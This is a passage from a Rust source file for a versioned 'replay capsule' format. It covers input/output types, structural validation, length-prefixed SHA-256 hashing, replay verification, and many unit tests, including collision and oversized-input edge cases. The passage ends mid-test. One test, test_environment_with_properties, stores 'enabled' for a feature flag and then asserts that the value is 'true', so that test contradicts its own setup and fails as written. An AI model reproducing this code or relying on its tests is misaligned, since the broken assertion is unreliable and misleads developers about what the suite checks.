//! bd-nbwo: Replay capsule format for deterministic re-execution (Section 10.17).
//!
//! A replay capsule is a self-contained, deterministic, format-versioned unit
//! that packages inputs, expected outputs, and the environment snapshot needed
//! for offline replay. Third-party verifiers can independently re-execute a
//! capsule and compare outputs without any external dependencies.
//!
//! # Format Versioning
//!
//! Every capsule carries a `format_version` field (u32). The current version is 1.
//! Future versions must maintain backwards-compatible deserialization for version 1
//! capsules.
//!
//! # Invariants
//!
//! - **INV-VSK-CAPSULE-SELF-CONTAINED**: A capsule carries ALL information needed
//!   for deterministic replay. No external lookups, no network, no ambient state.
//! - **INV-VSK-DETERMINISTIC-VERIFY**: Replaying the same capsule always produces
//!   the same output hash.
//! - **INV-VSK-STABLE-API**: The capsule schema is versioned for forward compatibility.

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/// Current format version for replay capsules.
pub const CURRENT_FORMAT_VERSION: u32 = 1;

/// Minimum supported format version.
pub const MIN_FORMAT_VERSION: u32 = 1;

/// Schema identifier for the replay capsule format.
pub const CAPSULE_SCHEMA_ID: &str = "replay-capsule-v1";

/// Stable posture marker for this structural replay capsule helper.
///
/// Replacement-critical signed capsule verification must use the stronger
/// connector/verifier-economy paths until the canonical shared kernel lands.
pub const STRUCTURAL_ONLY_SECURITY_POSTURE: &str = "structural_only_not_replacement_critical";

/// Stable rule id used by shortcut-regression guardrails.
pub const STRUCTURAL_ONLY_RULE_ID: &str = "VERIFIER_SHORTCUT_GUARD::SDK_REPLAY_CAPSULE";

// ---------------------------------------------------------------------------
// Core types
// ---------------------------------------------------------------------------

/// A single input event in a replay capsule.
///
/// INV-VSK-CAPSULE-SELF-CONTAINED: inputs carry all data inline.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CapsuleInput {
    /// Sequence number (monotonically increasing within a capsule).
    pub seq: u64,
    /// Raw input data bytes.
    pub data: Vec<u8>,
    /// Arbitrary key-value metadata for the input.
    pub metadata: BTreeMap<String, String>,
}

/// A single expected output in a replay capsule.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CapsuleOutput {
    /// Sequence number corresponding to the output.
    pub seq: u64,
    /// Raw expected output data bytes.
    pub data: Vec<u8>,
    /// Deterministic hash of the expected output.
    pub output_hash: String,
}

/// A snapshot of the environment at capsule creation time.
///
/// INV-VSK-CAPSULE-SELF-CONTAINED: the environment snapshot captures
/// everything needed to reproduce the execution context.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct EnvironmentSnapshot {
    /// Runtime version string.
    pub runtime_version: String,
    /// Platform identifier (e.g. "linux-x86_64").
    pub platform: String,
    /// Hash of the configuration used during capsule creation.
    pub config_hash: String,
    /// Additional environment properties.
    pub properties: BTreeMap<String, String>,
}

/// A self-contained replay capsule for deterministic re-execution.
///
/// # INV-VSK-CAPSULE-SELF-CONTAINED
/// The capsule includes inputs, expected outputs, and the full environment
/// snapshot. No external lookups are needed for replay.
///
/// # INV-VSK-DETERMINISTIC-VERIFY
/// Replaying the capsule produces a deterministic hash that can be compared
/// against the `expected_outputs`.
///
/// # INV-VSK-STABLE-API
/// The `format_version` field enables forward-compatible evolution.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReplayCapsule {
    /// Unique capsule identifier.
    pub capsule_id: String,
    /// Format version for compatibility checking.
    pub format_version: u32,
    /// Ordered input events.
    pub inputs: Vec<CapsuleInput>,
    /// Expected output events for verification.
    pub expected_outputs: Vec<CapsuleOutput>,
    /// Environment snapshot at capsule creation time.
    pub environment: EnvironmentSnapshot,
}

// ---------------------------------------------------------------------------
// Capsule errors
// ---------------------------------------------------------------------------

/// Errors that can occur during capsule operations.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CapsuleError {
    /// The capsule ID is empty.
    EmptyId,
    /// The format version is unsupported.
    UnsupportedVersion(u32),
    /// The input sequence is not monotonically increasing.
    NonMonotonicInputSequence,
    /// The capsule has no inputs.
    NoInputs,
    /// The capsule has no expected outputs.
    NoOutputs,
    /// The environment snapshot is incomplete.
    IncompleteEnvironment(String),
    /// A length prefix could not be encoded without truncation.
    LengthPrefixOverflow { field: &'static str, len: usize },
    /// Replay produced a different hash than expected.
    ReplayMismatch { expected: String, actual: String },
}

impl std::fmt::Display for CapsuleError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::EmptyId => write!(f, "capsule_id is empty"),
            Self::UnsupportedVersion(v) => {
                write!(
                    f,
                    "unsupported format_version={v} (supported={MIN_FORMAT_VERSION}..={CURRENT_FORMAT_VERSION})"
                )
            }
            Self::NonMonotonicInputSequence => {
                write!(f, "input sequence numbers are not strictly increasing")
            }
            Self::NoInputs => write!(f, "capsule has no inputs"),
            Self::NoOutputs => write!(f, "capsule has no expected outputs"),
            Self::IncompleteEnvironment(msg) => {
                write!(f, "incomplete environment snapshot: {msg}")
            }
            Self::LengthPrefixOverflow { field, len } => {
                write!(
                    f,
                    "length prefix overflow for {field}: len={len} cannot be encoded safely"
                )
            }
            Self::ReplayMismatch { expected, actual } => {
                write!(f, "replay mismatch: expected={expected}, actual={actual}")
            }
        }
    }
}

impl std::error::Error for CapsuleError {}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Deterministic SHA-256 hash (hex-encoded, 64 chars).
/// INV-VSK-DETERMINISTIC-VERIFY: same input always produces same output.
#[cfg(test)]
fn deterministic_hash(data: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(b"replay_capsule_v1:");
    hasher.update(data.as_bytes());
    hex::encode(hasher.finalize())
}

fn encode_len_prefix_with_limit(
    field: &'static str,
    len: usize,
    max_prefix: u64,
) -> Result<[u8; 8], CapsuleError> {
    let prefix =
        u64::try_from(len).map_err(|_| CapsuleError::LengthPrefixOverflow { field, len })?;
    if prefix > max_prefix {
        return Err(CapsuleError::LengthPrefixOverflow { field, len });
    }
    Ok(prefix.to_le_bytes())
}

/// Compute the deterministic replay hash over capsule inputs using
/// length-prefixed encoding to prevent delimiter collision attacks.
///
/// Each input contributes: `seq` as u64 LE bytes, then length-prefixed `data`.
/// This replaces the prior pipe-delimited string concatenation that was
/// vulnerable to hash collisions when input data contained pipe/colon chars.
fn try_compute_inputs_hash(inputs: &[CapsuleInput]) -> Result<String, CapsuleError> {
    try_compute_inputs_hash_with_prefix_limit(inputs, u64::MAX)
}

fn try_compute_inputs_hash_with_prefix_limit(
    inputs: &[CapsuleInput],
    max_prefix: u64,
) -> Result<String, CapsuleError> {
    let mut hasher = Sha256::new();
    hasher.update(b"replay_capsule_inputs_v1:");
    hasher.update(encode_len_prefix_with_limit(
        "inputs",
        inputs.len(),
        max_prefix,
    )?);
    for inp in inputs {
        hasher.update(inp.seq.to_le_bytes());
        hasher.update(encode_len_prefix_with_limit(
            "input.data",
            inp.data.len(),
            max_prefix,
        )?);
        hasher.update(&inp.data);
    }
    Ok(hex::encode(hasher.finalize()))
}

#[cfg(test)]
fn compute_inputs_hash(inputs: &[CapsuleInput]) -> String {
    try_compute_inputs_hash(inputs).expect("test input lengths should encode")
}

fn validate_environment_snapshot(environment: &EnvironmentSnapshot) -> Result<(), CapsuleError> {
    if environment.runtime_version.is_empty() {
        return Err(CapsuleError::IncompleteEnvironment(
            "runtime_version is empty".to_string(),
        ));
    }
    if environment.platform.is_empty() {
        return Err(CapsuleError::IncompleteEnvironment(
            "platform is empty".to_string(),
        ));
    }
    if environment.config_hash.is_empty() {
        return Err(CapsuleError::IncompleteEnvironment(
            "config_hash is empty".to_string(),
        ));
    }
    Ok(())
}

pub(crate) fn expected_outputs_match_hash(
    expected_outputs: &[CapsuleOutput],
    actual_hash: &str,
) -> bool {
    !expected_outputs.is_empty()
        && expected_outputs
            .iter()
            .all(|output| crate::security::constant_time::ct_eq(&output.output_hash, actual_hash))
}

// ---------------------------------------------------------------------------
// Capsule operations
// ---------------------------------------------------------------------------

/// Validate a capsule for structural correctness.
///
/// Checks: non-empty ID, supported version, non-empty inputs/outputs,
/// monotonic sequence, and complete environment.
pub fn validate_capsule(capsule: &ReplayCapsule) -> Result<(), CapsuleError> {
    if capsule.capsule_id.is_empty() {
        return Err(CapsuleError::EmptyId);
    }
    if capsule.format_version < MIN_FORMAT_VERSION
        || capsule.format_version > CURRENT_FORMAT_VERSION
    {
        return Err(CapsuleError::UnsupportedVersion(capsule.format_version));
    }
    if capsule.inputs.is_empty() {
        return Err(CapsuleError::NoInputs);
    }
    if capsule.expected_outputs.is_empty() {
        return Err(CapsuleError::NoOutputs);
    }
    // Check monotonic sequence
    for pair in capsule.inputs.windows(2) {
        if pair[0].seq >= pair[1].seq {
            return Err(CapsuleError::NonMonotonicInputSequence);
        }
    }
    validate_environment_snapshot(&capsule.environment)
}

/// Replay a capsule and return the computed output hash.
///
/// INV-VSK-DETERMINISTIC-VERIFY: same capsule always produces same hash.
/// INV-VSK-CAPSULE-SELF-CONTAINED: uses only data from the capsule.
pub fn replay(capsule: &ReplayCapsule) -> Result<String, CapsuleError> {
    validate_capsule(capsule)?;
    try_compute_inputs_hash(&capsule.inputs)
}

/// Replay a capsule and compare the result to all declared expected output hashes.
///
/// Returns `Ok(true)` if the replay hash matches, `Ok(false)` if it does not,
/// or `Err` if the capsule is structurally invalid.
pub fn replay_and_verify(capsule: &ReplayCapsule) -> Result<bool, CapsuleError> {
    let actual_hash = replay(capsule)?;

    if !capsule.expected_outputs.is_empty() {
        Ok(expected_outputs_match_hash(
            &capsule.expected_outputs,
            &actual_hash,
        ))
    } else {
        Err(CapsuleError::NoOutputs)
    }
}

/// Create a new replay capsule from inputs and environment.
///
/// Computes expected output hashes deterministically.
pub fn create_capsule(
    capsule_id: &str,
    inputs: Vec<CapsuleInput>,
    environment: EnvironmentSnapshot,
) -> Result<ReplayCapsule, CapsuleError> {
    if capsule_id.is_empty() {
        return Err(CapsuleError::EmptyId);
    }
    if inputs.is_empty() {
        return Err(CapsuleError::NoInputs);
    }
    for pair in inputs.windows(2) {
        if pair[0].seq >= pair[1].seq {
            return Err(CapsuleError::NonMonotonicInputSequence);
        }
    }
    validate_environment_snapshot(&environment)?;

    // Compute the expected output hash from inputs using length-prefixed encoding.
    let output_hash = try_compute_inputs_hash(&inputs)?;

    let expected_outputs = vec![CapsuleOutput {
        seq: 0,
        data: output_hash.as_bytes().to_vec(),
        output_hash,
    }];

    Ok(ReplayCapsule {
        capsule_id: capsule_id.to_string(),
        format_version: CURRENT_FORMAT_VERSION,
        inputs,
        expected_outputs,
        environment,
    })
}

/// Serialize a capsule to canonical JSON.
pub fn to_canonical_json(capsule: &ReplayCapsule) -> Result<String, serde_json::Error> {
    serde_json::to_string(capsule)
}

/// Deserialize a capsule from JSON.
pub fn from_json(json: &str) -> Result<ReplayCapsule, serde_json::Error> {
    serde_json::from_str(json)
}

/// Check whether a format version is supported.
pub fn is_version_supported(version: u32) -> bool {
    version >= MIN_FORMAT_VERSION && version <= CURRENT_FORMAT_VERSION
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn test_env() -> EnvironmentSnapshot {
        EnvironmentSnapshot {
            runtime_version: "1.0.0".to_string(),
            platform: "linux-x86_64".to_string(),
            config_hash: "aabb".repeat(8),
            properties: BTreeMap::new(),
        }
    }

    fn test_inputs() -> Vec<CapsuleInput> {
        vec![
            CapsuleInput {
                seq: 0,
                data: b"input-0".to_vec(),
                metadata: BTreeMap::new(),
            },
            CapsuleInput {
                seq: 1,
                data: b"input-1".to_vec(),
                metadata: BTreeMap::new(),
            },
            CapsuleInput {
                seq: 2,
                data: b"input-2".to_vec(),
                metadata: BTreeMap::new(),
            },
        ]
    }

    fn test_capsule() -> ReplayCapsule {
        create_capsule("capsule-test-001", test_inputs(), test_env()).unwrap()
    }

    // ── Constants ───────────────────────────────────────────────────

    #[test]
    fn test_current_format_version() {
        assert_eq!(CURRENT_FORMAT_VERSION, 1);
    }

    #[test]
    fn test_min_format_version() {
        assert_eq!(MIN_FORMAT_VERSION, 1);
    }

    #[test]
    fn test_capsule_schema_id() {
        assert_eq!(CAPSULE_SCHEMA_ID, "replay-capsule-v1");
    }

    // ── create_capsule ──────────────────────────────────────────────

    #[test]
    fn test_create_capsule_success() {
        let cap = test_capsule();
        assert_eq!(cap.capsule_id, "capsule-test-001");
        assert_eq!(cap.format_version, CURRENT_FORMAT_VERSION);
        assert_eq!(cap.inputs.len(), 3);
        assert_eq!(cap.expected_outputs.len(), 1);
    }

    #[test]
    fn test_create_capsule_empty_id() {
        let err = create_capsule("", test_inputs(), test_env()).unwrap_err();
        assert_eq!(err, CapsuleError::EmptyId);
    }

    #[test]
    fn test_create_capsule_no_inputs() {
        let err = create_capsule("cap", vec![], test_env()).unwrap_err();
        assert_eq!(err, CapsuleError::NoInputs);
    }

    #[test]
    fn test_create_capsule_non_monotonic() {
        let inputs = vec![
            CapsuleInput {
                seq: 5,
                data: b"a".to_vec(),
                metadata: BTreeMap::new(),
            },
            CapsuleInput {
                seq: 3,
                data: b"b".to_vec(),
                metadata: BTreeMap::new(),
            },
        ];
        let err = create_capsule("cap", inputs, test_env()).unwrap_err();
        assert_eq!(err, CapsuleError::NonMonotonicInputSequence);
    }

    #[test]
    fn test_create_capsule_empty_runtime_version() {
        let mut env = test_env();
        env.runtime_version = String::new();
        let err = create_capsule("cap", test_inputs(), env).unwrap_err();
        assert!(matches!(err, CapsuleError::IncompleteEnvironment(_)));
    }

    #[test]
    fn test_create_capsule_empty_platform() {
        let mut env = test_env();
        env.platform = String::new();
        let err = create_capsule("cap", test_inputs(), env).unwrap_err();
        assert!(matches!(err, CapsuleError::IncompleteEnvironment(_)));
    }

    #[test]
    fn test_create_capsule_empty_config_hash() {
        let mut env = test_env();
        env.config_hash = String::new();
        let err = create_capsule("cap", test_inputs(), env).unwrap_err();
        assert!(matches!(err, CapsuleError::IncompleteEnvironment(_)));
    }

    // ── validate_capsule ────────────────────────────────────────────

    #[test]
    fn test_validate_capsule_success() {
        let cap = test_capsule();
        assert!(validate_capsule(&cap).is_ok());
    }

    #[test]
    fn test_validate_capsule_empty_id() {
        let mut cap = test_capsule();
        cap.capsule_id = String::new();
        assert_eq!(validate_capsule(&cap).unwrap_err(), CapsuleError::EmptyId);
    }

    #[test]
    fn test_validate_capsule_bad_version() {
        let mut cap = test_capsule();
        cap.format_version = 0;
        assert!(matches!(
            validate_capsule(&cap).unwrap_err(),
            CapsuleError::UnsupportedVersion(0)
        ));
    }

    #[test]
    fn test_validate_capsule_no_inputs() {
        let mut cap = test_capsule();
        cap.inputs.clear();
        assert_eq!(validate_capsule(&cap).unwrap_err(), CapsuleError::NoInputs);
    }

    #[test]
    fn test_validate_capsule_no_outputs() {
        let mut cap = test_capsule();
        cap.expected_outputs.clear();
        assert_eq!(validate_capsule(&cap).unwrap_err(), CapsuleError::NoOutputs);
    }

    #[test]
    fn test_validate_capsule_non_monotonic() {
        let mut cap = test_capsule();
        cap.inputs[2].seq = 0;
        assert_eq!(
            validate_capsule(&cap).unwrap_err(),
            CapsuleError::NonMonotonicInputSequence
        );
    }

    #[test]
    fn test_validate_capsule_empty_runtime_version() {
        let mut cap = test_capsule();
        cap.environment.runtime_version = String::new();
        assert!(matches!(
            validate_capsule(&cap).unwrap_err(),
            CapsuleError::IncompleteEnvironment(_)
        ));
    }

    #[test]
    fn test_validate_capsule_empty_platform() {
        let mut cap = test_capsule();
        cap.environment.platform = String::new();
        assert!(matches!(
            validate_capsule(&cap).unwrap_err(),
            CapsuleError::IncompleteEnvironment(_)
        ));
    }

    #[test]
    fn test_validate_capsule_empty_config_hash() {
        let mut cap = test_capsule();
        cap.environment.config_hash = String::new();
        assert!(matches!(
            validate_capsule(&cap).unwrap_err(),
            CapsuleError::IncompleteEnvironment(_)
        ));
    }

    // ── replay ──────────────────────────────────────────────────────

    #[test]
    fn test_replay_success() {
        let cap = test_capsule();
        let hash = replay(&cap).unwrap();
        assert_eq!(hash.len(), 64);
    }

    #[test]
    fn test_replay_deterministic() {
        // INV-VSK-DETERMINISTIC-VERIFY
        let cap = test_capsule();
        let h1 = replay(&cap).unwrap();
        let h2 = replay(&cap).unwrap();
        assert_eq!(h1, h2);
    }

    #[test]
    fn test_replay_matches_expected() {
        let cap = test_capsule();
        let hash = replay(&cap).unwrap();
        assert_eq!(hash, cap.expected_outputs[0].output_hash);
    }

    #[test]
    fn test_replay_invalid_capsule() {
        let mut cap = test_capsule();
        cap.capsule_id = String::new();
        assert!(replay(&cap).is_err());
    }

    // ── replay_and_verify ───────────────────────────────────────────

    #[test]
    fn test_replay_and_verify_match() {
        let cap = test_capsule();
        assert!(replay_and_verify(&cap).expect("replay should succeed"));
    }

    #[test]
    fn test_replay_and_verify_mismatch() {
        let mut cap = test_capsule();
        cap.expected_outputs[0].output_hash = "wrong_hash".to_string();
        assert!(!replay_and_verify(&cap).unwrap());
    }

    #[test]
    fn test_replay_and_verify_extra_mismatched_output_fails() {
        let mut cap = test_capsule();
        cap.expected_outputs.push(CapsuleOutput {
            seq: 1,
            data: b"tampered".to_vec(),
            output_hash: "wrong_hash".to_string(),
        });
        assert!(!replay_and_verify(&cap).unwrap());
    }

    #[test]
    fn test_replay_and_verify_no_outputs() {
        let mut cap = test_capsule();
        cap.expected_outputs.clear();
        assert!(replay_and_verify(&cap).is_err());
    }

    // ── Serde round-trips ───────────────────────────────────────────

    #[test]
    fn test_capsule_serde_roundtrip() {
        let cap = test_capsule();
        let json = serde_json::to_string(&cap).expect("serialize should succeed");
        let parsed: ReplayCapsule =
            serde_json::from_str(&json).expect("deserialize should succeed");
        assert_eq!(cap, parsed);
    }

    #[test]
    fn test_capsule_input_serde_roundtrip() {
        let input = &test_inputs()[0];
        let json = serde_json::to_string(input).expect("serialize should succeed");
        let parsed: CapsuleInput = serde_json::from_str(&json).expect("deserialize should succeed");
        assert_eq!(*input, parsed);
    }

    #[test]
    fn test_capsule_output_serde_roundtrip() {
        let cap = test_capsule();
        let output = &cap.expected_outputs[0];
        let json = serde_json::to_string(output).expect("serialize should succeed");
        let parsed: CapsuleOutput =
            serde_json::from_str(&json).expect("deserialize should succeed");
        assert_eq!(*output, parsed);
    }

    #[test]
    fn test_environment_serde_roundtrip() {
        let env = test_env();
        let json = serde_json::to_string(&env).expect("serialize should succeed");
        let parsed: EnvironmentSnapshot =
            serde_json::from_str(&json).expect("deserialize should succeed");
        assert_eq!(env, parsed);
    }

    // ── to_canonical_json / from_json ───────────────────────────────

    #[test]
    fn test_canonical_json_roundtrip() {
        let cap = test_capsule();
        let json = to_canonical_json(&cap).expect("serialize should succeed");
        let parsed = from_json(&json).expect("deserialize should succeed");
        assert_eq!(cap, parsed);
    }

    #[test]
    fn test_from_json_invalid() {
        assert!(from_json("not json").is_err());
    }

    // ── is_version_supported ────────────────────────────────────────

    #[test]
    fn test_version_supported() {
        assert!(is_version_supported(1));
    }

    #[test]
    fn test_version_unsupported_zero() {
        assert!(!is_version_supported(0));
    }

    #[test]
    fn test_version_unsupported_future() {
        assert!(!is_version_supported(999));
    }

    // ── CapsuleError display ────────────────────────────────────────

    #[test]
    fn test_error_display_empty_id() {
        assert!(format!("{}", CapsuleError::EmptyId).contains("empty"));
    }

    #[test]
    fn test_error_display_unsupported_version() {
        let err = CapsuleError::UnsupportedVersion(0);
        let rendered = format!("{err}");
        assert!(rendered.contains("unsupported"));
        assert!(rendered.contains("supported=1..=1"));
    }

    #[test]
    fn test_error_display_non_monotonic() {
        assert!(format!("{}", CapsuleError::NonMonotonicInputSequence).contains("increasing"));
    }

    #[test]
    fn test_error_display_no_inputs() {
        assert!(format!("{}", CapsuleError::NoInputs).contains("no inputs"));
    }

    #[test]
    fn test_error_display_no_outputs() {
        assert!(format!("{}", CapsuleError::NoOutputs).contains("no expected outputs"));
    }

    #[test]
    fn test_error_display_incomplete_env() {
        let err = CapsuleError::IncompleteEnvironment("missing field".to_string());
        assert!(format!("{err}").contains("incomplete"));
    }

    #[test]
    fn test_error_display_replay_mismatch() {
        let err = CapsuleError::ReplayMismatch {
            expected: "a".to_string(),
            actual: "b".to_string(),
        };
        assert!(format!("{err}").contains("mismatch"));
    }

    // ── Send + Sync ─────────────────────────────────────────────────

    #[test]
    fn test_types_send_sync() {
        fn assert_send<T: Send>() {}
        fn assert_sync<T: Sync>() {}

        assert_send::<ReplayCapsule>();
        assert_sync::<ReplayCapsule>();
        assert_send::<CapsuleInput>();
        assert_sync::<CapsuleInput>();
        assert_send::<CapsuleOutput>();
        assert_sync::<CapsuleOutput>();
        assert_send::<EnvironmentSnapshot>();
        assert_sync::<EnvironmentSnapshot>();
        assert_send::<CapsuleError>();
        assert_sync::<CapsuleError>();
    }

    // ── deterministic_hash ──────────────────────────────────────────

    #[test]
    fn test_deterministic_hash_consistency() {
        let h1 = deterministic_hash("capsule_test");
        let h2 = deterministic_hash("capsule_test");
        assert_eq!(h1, h2);
        assert_eq!(h1.len(), 64);
    }

    #[test]
    fn test_deterministic_hash_different_inputs() {
        let h1 = deterministic_hash("data_a");
        let h2 = deterministic_hash("data_b");
        assert_ne!(h1, h2);
    }

    // ── Metadata in inputs ──────────────────────────────────────────

    #[test]
    fn test_input_with_metadata() {
        let mut meta = BTreeMap::new();
        meta.insert("source".to_string(), "test".to_string());
        meta.insert("priority".to_string(), "high".to_string());

        let inputs = vec![CapsuleInput {
            seq: 0,
            data: b"data".to_vec(),
            metadata: meta.clone(),
        }];
        let cap = create_capsule("cap-meta", inputs, test_env()).expect("create should succeed");
        assert_eq!(cap.inputs[0].metadata.len(), 2);
        assert_eq!(
            cap.inputs[0].metadata.get("source").expect("should exist"),
            "test"
        );
    }

    // ── Environment properties ──────────────────────────────────────

    #[test]
    fn test_environment_with_properties() {
        let mut env = test_env();
        env.properties
            .insert("feature_flag".to_string(), "enabled".to_string());
        let cap = create_capsule("cap-env", test_inputs(), env).expect("create should succeed");
        assert_eq!(
            cap.environment
                .properties
                .get("feature_flag")
                .expect("should exist"),
            "true"
        );
    }

    // ── NEGATIVE-PATH INLINE TESTS ─────────────────────────────────────────
    // Comprehensive edge case and boundary validation for security-critical functions

    /// Test compute_inputs_hash with collision and overflow attempts
    #[test]
    fn test_compute_inputs_hash_negative_paths() {
        // Empty inputs array
        let hash_empty = compute_inputs_hash(&[]);
        assert_eq!(hash_empty.len(), 64);
        assert!(hash_empty.chars().all(|c| c.is_ascii_hexdigit()));

        // Single input with empty data
        let empty_data_input = vec![CapsuleInput {
            seq: 0,
            data: vec![],
            metadata: BTreeMap::new(),
        }];
        let hash_empty_data = compute_inputs_hash(&empty_data_input);
        assert_eq!(hash_empty_data.len(), 64);
        assert_ne!(hash_empty_data, hash_empty); // Should be different from empty array

        // Maximum sequence number boundary
        let max_seq_input = vec![CapsuleInput {
            seq: u64::MAX,
            data: b"test".to_vec(),
            metadata: BTreeMap::new(),
        }];
        let hash_max_seq = compute_inputs_hash(&max_seq_input);
        assert_eq!(hash_max_seq.len(), 64);

        // Very large data payload - potential DoS
        let huge_data = vec![0u8; 100_000];
        let huge_input = vec![CapsuleInput {
            seq: 1,
            data: huge_data,
            metadata: BTreeMap::new(),
        }];
        let hash_huge = compute_inputs_hash(&huge_input);
        assert_eq!(hash_huge.len(), 64);

        // Hash collision attempt: different sequence orders with same data
        let inputs_order1 = vec![
            CapsuleInput { seq: 1, data: b"a".to_vec(), metadata: BTreeMap::new() },
            CapsuleInput { seq: 2, data: b"b".to_vec(), metadata: BTreeMap::new() },
        ];
        let inputs_order2 = vec![
            CapsuleInput { seq: 2, data: b"a".to_vec(), metadata: BTreeMap::new() },
            CapsuleInput { seq: 1, data: b"b".to_vec(), metadata: BTreeMap::new() },
        ];
        let hash1 = compute_inputs_hash(&inputs_order1);
        let hash2 = compute_inputs_hash(&inputs_order2);
        assert_ne!(hash1, hash2); // Different sequence numbers should produce different hashes

        // Data with embedded length bytes (collision attempt)
        let tricky_data1 = vec![CapsuleInput {
            seq: 0,
            data: vec![0, 0, 0, 0, 0, 0, 0, 5, b'h', b'e', b'l', b'l', b'o'], // Embedded length prefix
            metadata: BTreeMap::new(),
        }];
        let tricky_data2 = vec![CapsuleInput {
            seq: 0,
            data: b"hello".to_vec(),
            metadata: BTreeMap::new(),
        }];
        let hash_tricky1 = compute_inputs_hash(&tricky_data1);
        let hash_tricky2 = compute_inputs_hash(&tricky_data2);
        assert_ne!(hash_tricky1, hash_tricky2); // Length prefixing should prevent collision

        // Maximum number of inputs - capacity boundary
        let many_inputs: Vec<CapsuleInput> = (0..10000)
            .map(|i| CapsuleInput {
                seq: i,
                data: format!("data-{}", i).into_bytes(),
                metadata: BTreeMap::new(),
            })
            .collect();
        let hash_many = compute_inputs_hash(&many_inputs);
        assert_eq!(hash_many.len(), 64);

        // Domain separator collision attempt with data
        let domain_collision = vec![CapsuleInput {
            seq: 0,
            data: b"replay_capsule_inputs_v1:".to_vec(),
            metadata: BTreeMap::new(),
        }];
        let hash_domain = compute_inputs_hash(&domain_collision);
        assert_eq!(hash_domain.len(), 64);
        assert_ne!(hash_domain, hash_empty); // Should not collide with empty input

        // Binary data with null bytes and control characters
        let binary_data = vec![CapsuleInput {
            seq: 0,
            data: vec![0, 1, 2, 255, 254, 253, 0, 0, 0],
            metadata: BTreeMap::new(),
        }];
        let hash_binary = compute_inputs_hash(&binary_data);
        assert_eq!(hash_binary.len(), 64);
    }

    #[test]
    fn test_compute_inputs_hash_rejects_oversized_length_prefix() {
        let inputs = vec![CapsuleInput {
            seq: 0,
            data: vec![0, 1, 2, 3],
            metadata: BTreeMap::new(),
        }];

        let err = try_compute_inputs_hash_with_prefix_limit(&inputs, 3)
            .expect_err("data length beyond the prefix limit should fail closed");

        assert_eq!(
            err,
            CapsuleError::LengthPrefixOverflow {
                field: "input.data",
                len: 4,
            }
        );
    }

    /// Test expected_outputs_match_hash with timing attack resistance
    #[test]
    fn test_expected_outputs_match_hash_negative_paths() {
        // Empty outputs array should fail
        let empty_outputs: Vec<CapsuleOutput> = vec![];
        assert!(!expected_outputs_match_hash(&empty_outputs, "any_hash"));

        // Single output with correct hash
        let correct_hash = "abc123def456";
        let outputs_correct = vec![CapsuleOutput {
            seq: 0,
            data: b"test".to_vec(),
            output_hash: correct_hash.to_string(),
        }];
        assert!(expected_outputs_match_hash(&outputs_correct, correct_hash));

        // Multiple outputs, all must match (AND semantics)
        let outputs_multi = vec![
            CapsuleOutput {
                seq: 0,
                data: b"test1".to_vec(),
                output_hash: correct_hash.to_string(),
            },
            CapsuleOutput {
                seq: 1,
                data: b"test2".to_vec(),
                output_hash: correct_hash.to_string(),
            },
            CapsuleOutput {
                seq: 2,
                data: b"test3".to_vec(),
                output_hash: correct_hash.to_string(),
            },
        ];
        assert!(expected_outputs_match_hash(&outputs_multi, correct_hash));

        // One mismatched output should fail entire check
        let outputs_one_bad = vec![
            CapsuleOutput {
                seq: 0,
                data: b"test1".to_vec(),
                output_hash: correct_hash.to_string(),
            },
            CapsuleOutput {
                seq: 1,
                data: b"test2".to_vec(),
                output_hash: "wrong_hash".to_string(), // Mismatch
            },
            CapsuleOutput {
                seq: 2,
                data: b"test3".to_vec(),
                output_hash: correct_hash.to_string(),
            },
        ];
        assert!(!expected_outputs_match_hash(&outputs_one_bad, correct_hash));

        // Empty hash strings (edge case)
        let outputs_empty_hash = vec![CapsuleOutput {
            seq: 0,
            data: b"test".to_vec(),
            output_hash: String::new(),
        }];
        assert!(!expected_outputs_match_hash(&outputs_empty_hash, ""));
        assert!(!expected_outputs_match_hash(&outputs_empty_hash, "non_empty"));

        // Very long hash strings (DoS protection)
        let long_hash = "a".repeat(100_000);
        let outputs_long = vec![CapsuleOutput {
            seq: 0,
            data: b"test".to_vec(),
            output_hash: long_hash.clone(),
        }];
        assert!(expected_outputs_match_hash(&outputs_long, &long_hash));

        // Case sensitivity check
        let outputs_case = vec![CapsuleOutput {
            seq: 0,
            data: b"test".to_vec(),
            output_hash: "AbC123".to_string(),
        }];
        assert!(!expected_outputs_match_hash(&outputs_case, "abc123"));
        assert!(!expected_outputs_match_hash(&outputs_case, "ABC123"));
        assert!(expected_outputs_match_hash(&outputs_case, "AbC123"));

        // Unicode characters in hash (unusual but should work)
        let unicode_hash = "hash_with_🔒_unicode";
        let outputs_unicode = vec![CapsuleOutput {
            seq: 0,
            data: b"test".to_vec(),
            output_hash: unicode_hash.to_string(),
        }];
        assert!(expected_outputs_match_hash(&outputs_unicode, unicode_hash));
    }

    /// Test validate_environment_snapshot with malformed environments
    #[test]
    fn test_validate_environment_snapshot_negative_paths() {
        // All empty fields
        let env_all_empty = EnvironmentSnapshot {
            runtime_version: String::new(),
            platform: String::new(),
            config_hash: String::new(),
            properties: BTreeMap::new(),
        };
        let result = validate_environment_snapshot(&env_all_empty);
        match result {
            Err(CapsuleError::IncompleteEnvironment(msg)) => {
                assert!(msg.contains("runtime_version"));
            }
            _ => panic!("Expected IncompleteEnvironment error for runtime_version"),
        }

        // Only runtime_version empty
        let env_empty_runtime = EnvironmentSnapshot {
            runtime_version: String::new(),
            platform: "linux-x86_64".to_string(),
            config_hash: "abc123".to_string(),
            properties: BTreeMap::new(),
        };
        match validate_environment_snapshot(&env_empty_runtime) {
            Err(CapsuleError::IncompleteEnvironment(msg)) => {
                assert!(msg.contains("runtime_version"));
            }
            _ => panic!("Expected runtime_version error"),
        }

        // Only platform empty
        let env_empty_platform = EnvironmentSnapshot {
            runtime_version: "1.0.0".to_string(),
            platform: String::new(),
            config_hash: "abc123".to_string(),
            properties: BTreeMap::new(),
